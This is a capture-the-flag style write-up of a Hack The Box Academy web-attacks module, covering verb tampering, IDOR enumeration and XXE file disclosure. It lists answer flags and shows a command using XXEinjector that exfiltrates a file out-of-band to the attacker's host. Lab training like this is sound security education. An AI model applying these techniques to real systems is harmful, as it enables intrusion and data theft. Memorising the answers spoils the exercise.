# Web Attacks
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Web Attacks
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 2 days
* Date: 01-08-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Bypassing Basic Authentication
### Question:
![](./attachments/Pasted%20image%2020220802101338.png)

*Hints: See what HTTP method is used by the web application, and then try to use a different one.*

![](./attachments/Pasted%20image%2020220802111223.png)

![](./attachments/Pasted%20image%2020220802111238.png)

**Answer:** `HTB{4lw4y5_c0v3r_4ll_v3rb5}`

---
## Bypassing Security Filters
### Question:
![](./attachments/Pasted%20image%2020220802101446.png)

*Hints: See which HTTP method the injection filter is using, and try to use a different one.*

![](./attachments/Pasted%20image%2020220802125956.png)

**Answer:** `HTB{b3_v3rb_c0n51573n7}`

---
## Mass IDOR Enumeration
### Question:
![](./attachments/Pasted%20image%2020220802101530.png)

*Hints: Try to enumerate all files, and not PDF's only, by changing the regex pattern to match any extension. Also, be sure to use the same HTTP request method as the web page.*

Fuzz the POST request, `{1...20}`. 

![](./attachments/Pasted%20image%2020220803145746.png)

![](./attachments/Pasted%20image%2020220803150040.png)

**Answer:** `HTB{4ll_f1l35_4r3_m1n3}`

---
## Bypassing Encoded References
### Question:
![](./attachments/Pasted%20image%2020220802101628.png)

*Hints: See what encoding/hashing method the page is using, and try to calculate the same thing for each employee's uid.*

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ for i in {1..20}; do echo -n $i | base64 -w 0 ; done
MQ==Mg==Mw==NA==NQ==Ng==Nw==OA==OQ==MTA=MTE=MTI=MTM=MTQ=MTU=MTY=MTc=MTg=MTk=MjA=
```

![](./attachments/Pasted%20image%2020220804120114.png)

**Answer:** `HTB{h45h1n6_1d5_w0n7_570p_m3}`

---
## IDOR in Insecure APIs
### Question:
![](./attachments/Pasted%20image%2020220802102134.png)

*Hints: Simply send a get request to the API endpoint ending with /5*

Edit the profile, and get the `GET` request in burp.

![](./attachments/Pasted%20image%2020220804122351.png)

**Answer:** `eb4fe264c10eb7a528b047aa983a4829`

---
## Chaining IDOR Vulnerabilities
### Question:
![](./attachments/Pasted%20image%2020220802102211.png)

*Hint: Don't forget to set the admin's correct uuid.*

![](./attachments/Pasted%20image%2020220804123619.png)

Generate a put request and insert the damin values with the new email.

![](./attachments/Pasted%20image%2020220804123851.png)

![](./attachments/Pasted%20image%2020220804123927.png)

**Answer:** `HTB{1_4m_4n_1d0r_m4573r}`

---
## Local File Disclosure
### Question:
![](./attachments/Pasted%20image%2020220802102253.png)

*Hints: Use PHP filters*

![](./attachments/Pasted%20image%2020220804133758.png)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K" | base64 -d
<?php

$api_key = "UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg";

try {
        $conn = pg_connect("host=localhost port=5432 dbname=users user=postgres password=iUer^vd(e1Pl9");
}

catch ( exception $e ) {
        echo $e->getMessage();
}

?>
```

**Answer:** `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`

---
## Advanced File Disclosure
### Question:
![](./attachments/Pasted%20image%2020220802102332.png)

*Hints: Don't forget to point the 'file' to the flag in your local DTD file.*

![](./attachments/Pasted%20image%2020220804151251.png)

**Answer:** `HTB{3rr0r5_c4n_l34k_d474}`

---
## Blind Data Exfiltration
### Question:
![](./attachments/Pasted%20image%2020220802102511.png)

```bash
┌──(kali㉿kali)-[~/Downloads/XXEinjector]
└─$ ruby XXEinjector.rb --host=10.10.15.75 --httpport=8089 --file=xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter 
XXEinjector by Jakub Pałaczyński

Enumeration options:
"y" - enumerate currect file (default)
"n" - skip currect file
"a" - enumerate all files in currect directory
"s" - skip all files in currect directory
"q" - quit

[-] Multiple instances of XML found. It may results in false-positives.
[+] Sending request with malicious XML.
[+] Responding with XML for: /327a6c4304ad5938eaf0efb6cc3e53dc.php
[+] Retrieved data:
[+] Nothing else to do. Exiting.
```

```bash
┌──(kali㉿kali)-[~/Downloads/XXEinjector]
└─$ cat Logs/10.129.3.201/327a6c4304ad5938eaf0efb6cc3e53dc.php.log
<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
```

**Answer:** `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`

---
## Skills Assessment
### Question:
![](./attachments/Pasted%20image%2020220802102527.png)

API URL with user info: `IP:PORT/api.php/user/72`

```bash
┌──(kali㉿kali)-[~/Downloads/XXEinjector]
└─$ python3                                                                                                                                
Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> for i in range(100):
...     print(i)
... 
0
1
2
3
(...)
97 
98 
99
```

![](./attachments/Pasted%20image%2020220805103116.png)

Admin token:

![](./attachments/Pasted%20image%2020220805110502.png)

![](./attachments/Pasted%20image%2020220805155026.png)

Login as admin:

![](./attachments/Pasted%20image%2020220805155425.png)

Create event

![](./attachments/Pasted%20image%2020220805164648.png)

![](./attachments/Pasted%20image%2020220805164825.png)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K" | base64 -d
<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

**Answer:** `HTB{m4573r_w3b_4774ck3r}`

---
**Tags:** [[Hack The Box Academy]]